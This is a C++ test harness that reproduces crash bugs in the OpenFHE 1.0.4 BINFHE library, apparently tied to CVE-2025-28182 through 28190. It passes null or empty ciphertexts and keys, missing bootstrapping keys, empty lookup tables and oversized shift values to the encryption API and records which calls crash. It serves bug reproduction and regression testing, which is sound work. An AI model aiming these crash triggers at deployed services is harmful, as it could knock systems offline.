// binfhe_probe.cpp
//
// Minimal probe for the Eidolon FSE 2026 bug class:
//   SIGSEGV / crashes from "missing null pointer validation" in OpenFHE BINFHE
//   (TFHE) entry points: Decrypt, EvalSign, BTKeyGen, EvalNOT, EvalDecomp,
//   EvalBinGate, EvalFloor, EvalFunc.
//   CVEs CVE-2025-28182 .. CVE-2025-28190.
//
// Target: installed OpenFHE 1.0.4 (source checkout == tag v1.0.4).
//
// Every probe runs in a forked child so one crash does not stop the rest.
// The parent prints a table: PROBE <name>: OK | SIGSEGV | SIGABRT | exception(<type>)
//
// Usage:
//   ./binfhe_probe                 run all probes, each in a forked child
//   ./binfhe_probe --list          list probe names
//   ./binfhe_probe <name>          run one probe IN-PROCESS (no fork) -- for
//                                  gdb / sanitizer backtraces and repro
//
// Types (installed 1.0.4 headers):
//   include/openfhe/binfhe/lwe-ciphertext-fwd.h:
//       using LWECiphertext      = std::shared_ptr<LWECiphertextImpl>;
//       using ConstLWECiphertext = const std::shared_ptr<const LWECiphertextImpl>;
//   include/openfhe/binfhe/lwe-privatekey-fwd.h:
//       using LWEPrivateKey      = std::shared_ptr<LWEPrivateKeyImpl>;
//       using ConstLWEPrivateKey = const std::shared_ptr<const LWEPrivateKeyImpl>;
//   -> a "null ciphertext" is a default-constructed shared_ptr; the callee then
//      does ct->GetModulus() etc. on a null pointer.

#include "binfhecontext.h"

#include <csignal>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <exception>
#include <iostream>
#include <memory>
#include <string>
#include <typeinfo>
#include <vector>

#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

using namespace lbcrypto;

namespace {

// ---------------------------------------------------------------------------
// Shared fixtures
// ---------------------------------------------------------------------------

// A TOY context with bootstrapping keys generated (fast).
BinFHEContext g_ctx;
LWEPrivateKey g_sk;
LWECiphertext g_ct_a;  // Encrypt(sk, 0)
LWECiphertext g_ct_b;  // Encrypt(sk, 1)

// A TOY context with NO bootstrapping keys (BTKeyGen never called).
BinFHEContext g_ctx_nokey;
LWEPrivateKey g_sk_nokey;
LWECiphertext g_ct_nokey_a;
LWECiphertext g_ct_nokey_b;

// A scratch TOY context with no keys, used for BTKeyGen probes so we do not
// disturb g_ctx / g_ctx_nokey.
BinFHEContext g_ctx_scratch;

// Large-precision context (STD128, logQ=17) following
// src/binfhe/examples/eval-sign.cpp. Needed for EvalSign / EvalDecomp, which
// reject small-precision ciphertexts (mod <= q) with not_implemented_error.
// This one HAS keys.
BinFHEContext g_lg;
LWEPrivateKey g_lg_sk;
LWECiphertext g_lg_ct;

// Same large-precision parameters but WITHOUT bootstrapping keys.
BinFHEContext g_lg_nokey;
LWEPrivateKey g_lg_sk_nokey;
LWECiphertext g_lg_ct_nokey;

NativeInteger g_q_toy;         // small ciphertext modulus of g_ctx
std::vector<NativeInteger> g_lut;  // LUT of size q for EvalFunc

// ---------------------------------------------------------------------------
// Probe registry
// ---------------------------------------------------------------------------

struct Probe {
    const char* name;
    void (*fn)();
};

std::vector<Probe>& registry() {
    static std::vector<Probe> r;
    return r;
}

struct Register {
    Register(const char* n, void (*f)()) {
        registry().push_back(Probe{n, f});
    }
};

#define PROBE(name)                      \
    void probe_##name();                 \
    Register reg_##name(#name, probe_##name); \
    void probe_##name()

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// Deliberately malformed / degenerate objects.
LWEPrivateKey null_sk() {
    return LWEPrivateKey();  // empty shared_ptr
}
LWECiphertext null_ct() {
    return LWECiphertext();  // empty shared_ptr
}
// Non-null pointer, but empty contents (m_a empty, m_b = 0, modulus 0).
LWECiphertext empty_ct() {
    return std::make_shared<LWECiphertextImpl>();
}
LWEPrivateKey empty_sk() {
    return std::make_shared<LWEPrivateKeyImpl>();
}

// ---------------------------------------------------------------------------
// Decrypt  (CVE-2025-28182 class)
// ---------------------------------------------------------------------------

PROBE(decrypt_null_ct) {
    LWEPlaintext res = 0;
    g_ctx.Decrypt(g_sk, null_ct(), &res);
}

PROBE(decrypt_null_sk) {
    LWEPlaintext res = 0;
    g_ctx.Decrypt(null_sk(), g_ct_a, &res);
}

PROBE(decrypt_null_result) {
    g_ctx.Decrypt(g_sk, g_ct_a, nullptr);
}

PROBE(decrypt_empty_impl_ct) {
    LWEPlaintext res = 0;
    g_ctx.Decrypt(g_sk, empty_ct(), &res);
}

PROBE(decrypt_empty_impl_sk) {
    LWEPlaintext res = 0;
    g_ctx.Decrypt(empty_sk(), g_ct_a, &res);
}

PROBE(decrypt_ok) {  // sanity baseline
    LWEPlaintext res = 0;
    g_ctx.Decrypt(g_sk, g_ct_a, &res);
}

// ---------------------------------------------------------------------------
// EvalNOT  (CVE-2025-28185 class)
// ---------------------------------------------------------------------------

PROBE(evalnot_null_ct) {
    g_ctx.EvalNOT(null_ct());
}

PROBE(evalnot_empty_impl) {
    g_ctx.EvalNOT(empty_ct());
}

PROBE(evalnot_ok) {
    g_ctx.EvalNOT(g_ct_a);
}

// ---------------------------------------------------------------------------
// EvalBinGate  (CVE-2025-28187 class)
// ---------------------------------------------------------------------------

PROBE(evalbingate_null_both) {
    g_ctx.EvalBinGate(AND, null_ct(), null_ct());
}

PROBE(evalbingate_null_ct1) {
    g_ctx.EvalBinGate(AND, null_ct(), g_ct_b);
}

PROBE(evalbingate_null_ct2) {
    g_ctx.EvalBinGate(AND, g_ct_a, null_ct());
}

PROBE(evalbingate_xor_null_ct2) {
    // XOR takes the EvalNOT path in BinFHEScheme::EvalBinGate
    g_ctx.EvalBinGate(XOR, g_ct_a, null_ct());
}

PROBE(evalbingate_empty_impl) {
    g_ctx.EvalBinGate(AND, empty_ct(), g_ct_b);
}

PROBE(evalbingate_nokey) {
    // both ciphertexts valid and distinct, but BTKeyGen was never called
    g_ctx_nokey.EvalBinGate(AND, g_ct_nokey_a, g_ct_nokey_b);
}

PROBE(evalbingate_context_mismatch) {
    // ct_a from g_ctx, ct_b from g_ctx_nokey: different contexts/keys
    g_ctx.EvalBinGate(AND, g_ct_a, g_ct_nokey_b);
}

PROBE(evalbingate_ok) {
    g_ctx.EvalBinGate(AND, g_ct_a, g_ct_b);
}

// ---------------------------------------------------------------------------
// BTKeyGen  (CVE-2025-28184 class)
// ---------------------------------------------------------------------------

PROBE(btkeygen_null_sk) {
    g_ctx_scratch.BTKeyGen(null_sk());
}

PROBE(btkeygen_empty_sk) {
    g_ctx_scratch.BTKeyGen(empty_sk());
}

// ---------------------------------------------------------------------------
// EvalFunc  (CVE-2025-28190 class)
// ---------------------------------------------------------------------------

PROBE(evalfunc_null_ct) {
    g_ctx.EvalFunc(null_ct(), g_lut);
}

PROBE(evalfunc_empty_impl_ct) {
    g_ctx.EvalFunc(empty_ct(), g_lut);
}

PROBE(evalfunc_empty_lut) {
    // checkInputFunction(LUT, q) indexes lut[0] and lut[lut.size()/2]
    g_ctx.EvalFunc(g_ct_a, std::vector<NativeInteger>{});
}

PROBE(evalfunc_lut_size1) {
    g_ctx.EvalFunc(g_ct_a, std::vector<NativeInteger>{NativeInteger(0)});
}

PROBE(evalfunc_nokey) {
    g_ctx_nokey.EvalFunc(g_ct_nokey_a, g_lut);
}

PROBE(evalfunc_ok) {
    g_ctx.EvalFunc(g_ct_a, g_lut);
}

// ---------------------------------------------------------------------------
// EvalFloor  (CVE-2025-28188 class)
// ---------------------------------------------------------------------------

PROBE(evalfloor_null_ct) {
    g_ctx.EvalFloor(null_ct(), 0);
}

PROBE(evalfloor_empty_impl_ct) {
    g_ctx.EvalFloor(empty_ct(), 0);
}

PROBE(evalfloor_nokey) {
    g_ctx_nokey.EvalFloor(g_ct_nokey_a, 0);
}

// roundbits is declared uint32_t. BinFHEScheme::EvalFloor computes
//   q = beta * 2 * (1 << roundbits)
// so large roundbits shift out of range.
PROBE(evalfloor_roundbits_1) {
    g_ctx.EvalFloor(g_ct_a, 1);
}

PROBE(evalfloor_roundbits_63) {
    g_ctx.EvalFloor(g_ct_a, 63);
}

PROBE(evalfloor_roundbits_64) {
    g_ctx.EvalFloor(g_ct_a, 64);
}

PROBE(evalfloor_roundbits_1000) {
    g_ctx.EvalFloor(g_ct_a, 1000);
}

PROBE(evalfloor_roundbits_uintmax) {
    g_ctx.EvalFloor(g_ct_a, static_cast<uint32_t>(-1));
}

PROBE(evalfloor_roundbits_intmin) {
    g_ctx.EvalFloor(g_ct_a, static_cast<uint32_t>(INT32_MIN));
}

PROBE(evalfloor_roundbits_intmax) {
    g_ctx.EvalFloor(g_ct_a, static_cast<uint32_t>(INT32_MAX));
}

PROBE(evalfloor_ok) {
    g_ctx.EvalFloor(g_ct_a, 0);
}

// ---------------------------------------------------------------------------
// EvalSign  (CVE-2025-28183 class)
// ---------------------------------------------------------------------------

PROBE(evalsign_null_ct) {
    g_ctx.EvalSign(null_ct());
}

PROBE(evalsign_empty_impl_ct) {
    g_ctx.EvalSign(empty_ct());
}

PROBE(evalsign_smallprec_nokey) {
    // mod <= q -> not_implemented_error expected
    g_ctx_nokey.EvalSign(g_ct_nokey_a);
}

PROBE(evalsign_large_empty_keymap) {
    // large precision ct but BTKeyGen never called -> empty m_BTKey_map
    g_lg_nokey.EvalSign(g_lg_ct_nokey);
}

PROBE(evalsign_ok) {
    g_lg.EvalSign(g_lg_ct);
}

// ---------------------------------------------------------------------------
// EvalDecomp  (CVE-2025-28186 class)
// ---------------------------------------------------------------------------

PROBE(evaldecomp_null_ct) {
    g_ctx.EvalDecomp(null_ct());
}

PROBE(evaldecomp_empty_impl_ct) {
    g_ctx.EvalDecomp(empty_ct());
}

PROBE(evaldecomp_smallprec_nokey) {
    g_ctx_nokey.EvalDecomp(g_ct_nokey_a);
}

PROBE(evaldecomp_large_empty_keymap) {
    g_lg_nokey.EvalDecomp(g_lg_ct_nokey);
}

PROBE(evaldecomp_ok) {
    g_lg.EvalDecomp(g_lg_ct);
}

// ---------------------------------------------------------------------------
// Context never initialised (GenerateBinFHEContext never called)
// ---------------------------------------------------------------------------

PROBE(uninit_ctx_evalnot) {
    BinFHEContext uninit;
    uninit.EvalNOT(g_ct_a);
}

PROBE(uninit_ctx_decrypt) {
    BinFHEContext uninit;
    LWEPlaintext res = 0;
    uninit.Decrypt(g_sk, g_ct_a, &res);
}

// ---------------------------------------------------------------------------
// Fixture setup
// ---------------------------------------------------------------------------

bool g_quiet = false;

void setup() {
    // --- TOY with keys ---
    g_ctx.GenerateBinFHEContext(TOY, GINX);
    g_sk     = g_ctx.KeyGen();
    g_ctx.BTKeyGen(g_sk);
    g_ct_a = g_ctx.Encrypt(g_sk, 0, FRESH);
    g_ct_b = g_ctx.Encrypt(g_sk, 1, FRESH);

    // --- TOY without keys ---
    g_ctx_nokey.GenerateBinFHEContext(TOY, GINX);
    g_sk_nokey     = g_ctx_nokey.KeyGen();
    g_ct_nokey_a   = g_ctx_nokey.Encrypt(g_sk_nokey, 0, FRESH);
    g_ct_nokey_b   = g_ctx_nokey.Encrypt(g_sk_nokey, 1, FRESH);

    // --- scratch TOY without keys (for BTKeyGen probes) ---
    g_ctx_scratch.GenerateBinFHEContext(TOY, GINX);

    // --- LUT of size q for EvalFunc ---
    g_q_toy = g_ctx.GetParams()->GetLWEParams()->Getq();
    g_lut.resize(g_q_toy.ConvertToInt());
    for (size_t i = 0; i < g_lut.size(); ++i)
        g_lut[i] = NativeInteger(i % 4);

    // --- large precision (STD128, logQ = 17), WITH keys ---
    const uint32_t logQ = 17;
    g_lg.GenerateBinFHEContext(STD128, false, logQ, 0, GINX, false);
    const uint64_t Ql = uint64_t(1) << logQ;
    const int q_small = 4096;  // q for STD128 == 2 * ringDim == 4096
    const uint64_t factor = Ql / uint64_t(q_small);
    const uint64_t Pl = g_lg.GetMaxPlaintextSpace().ConvertToInt() * factor;

    g_lg_sk = g_lg.KeyGen();
    g_lg.BTKeyGen(g_lg_sk);
    g_lg_ct = g_lg.Encrypt(g_lg_sk, Pl / 2, FRESH, Pl, NativeInteger(Ql));

    // --- large precision WITHOUT keys ---
    g_lg_nokey.GenerateBinFHEContext(STD128, false, logQ, 0, GINX, false);
    g_lg_sk_nokey = g_lg_nokey.KeyGen();
    g_lg_ct_nokey = g_lg_nokey.Encrypt(g_lg_sk_nokey, Pl / 2, FRESH, Pl, NativeInteger(Ql));
}

// ---------------------------------------------------------------------------
// Runner
// ---------------------------------------------------------------------------

struct ProbeOutcome {
    std::string result;  // "OK" | "EXC:<type>" | signal name | "EXITED(n)"
};

ProbeOutcome run_child(void (*fn)()) {
    int fd[2];
    if (pipe(fd) != 0) {
        return {"PIPE_ERROR"};
    }
    pid_t pid = fork();
    if (pid < 0) {
        close(fd[0]);
        close(fd[1]);
        return {"FORK_ERROR"};
    }
    if (pid == 0) {
        // ---- child ----
        close(fd[0]);
        std::string msg;
        try {
            fn();
            msg = "OK";
        }
        catch (const std::exception& e) {
            msg = std::string("EXC:") + typeid(e).name();
            if (!g_quiet)
                fprintf(stderr, "    [child] std::exception: %s\n", e.what());
        }
        catch (...) {
            msg = "EXC:non-std";
        }
        ssize_t ignored = write(fd[1], msg.data(), msg.size());
        (void)ignored;
        close(fd[1]);
        fflush(nullptr);
        _exit(0);
    }
    // ---- parent ----
    close(fd[1]);
    char buf[512];
    std::string msg;
    for (;;) {
        ssize_t n = read(fd[0], buf, sizeof(buf));
        if (n <= 0)
            break;
        msg.append(buf, static_cast<size_t>(n));
        if (msg.size() >= sizeof(buf) - 1)
            break;
    }
    close(fd[0]);

    int status = 0;
    waitpid(pid, &status, 0);

    ProbeOutcome out;
    if (!msg.empty()) {
        out.result = msg;
        return out;
    }
    if (WIFSIGNALED(status)) {
        int sig = WTERMSIG(status);
        const char* nm = strsignal(sig);
        out.result = std::string("SIG") + (nm ? nm : "?");
        // normalize to the classic SIGSEGV / SIGABRT spellings
        if (sig == SIGSEGV)
            out.result = "SIGSEGV";
        else if (sig == SIGABRT)
            out.result = "SIGABRT";
        else if (sig == SIGBUS)
            out.result = "SIGBUS";
        else if (sig == SIGFPE)
            out.result = "SIGFPE";
        else if (sig == SIGILL)
            out.result = "SIGILL";
    }
    else if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);
        if (code == 0)
            out.result = "EXITED(0)-no-message";  // e.g. sanitizer exit
        else
            out.result = "EXITED(" + std::to_string(code) + ")-sanitizer-or-abort";
    }
    else {
        out.result = "UNKNOWN_STATUS";
    }
    return out;
}

int run_all() {
    printf("PID parent = %d\n", (int)getpid());
    fflush(stdout);
    int ncrash = 0, nexc = 0, nok = 0;
    std::vector<std::string> crashes;
    for (const auto& p : registry()) {
        printf("PROBE %-36s : ", p.name);
        fflush(stdout);
        ProbeOutcome o = run_child(p.fn);
        printf("%s\n", o.result.c_str());
        fflush(stdout);
        if (o.result == "OK") {
            ++nok;
        }
        else if (o.result.rfind("EXC:", 0) == 0) {
            ++nexc;
        }
        else {
            ++ncrash;
            crashes.push_back(std::string(p.name) + " -> " + o.result);
        }
    }
    printf("\n=== SUMMARY: %zu probes, %d OK, %d exception, %d crash ===\n", registry().size(), nok, nexc, ncrash);
    for (const auto& c : crashes)
        printf("  CRASH %s\n", c.c_str());
    fflush(stdout);
    return ncrash == 0 ? 0 : 1;
}

}  // namespace

int main(int argc, char** argv) {
    bool list_only = false;
    std::string single;
    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "--list") == 0)
            list_only = true;
        else if (strcmp(argv[i], "--quiet") == 0)
            g_quiet = true;
        else
            single = argv[i];
    }

    if (list_only) {
        for (const auto& p : registry())
            printf("%s\n", p.name);
        return 0;
    }

    setup();

    if (!single.empty()) {
        // in-process single probe: a crash here is meant to be observed directly
        for (const auto& p : registry()) {
            if (single == p.name) {
                fprintf(stderr, "running probe '%s' in-process\n", p.name);
                p.fn();
                fprintf(stderr, "probe '%s' returned normally\n", p.name);
                return 0;
            }
        }
        fprintf(stderr, "no such probe: %s\n", single.c_str());
        return 2;
    }

    return run_all();
}
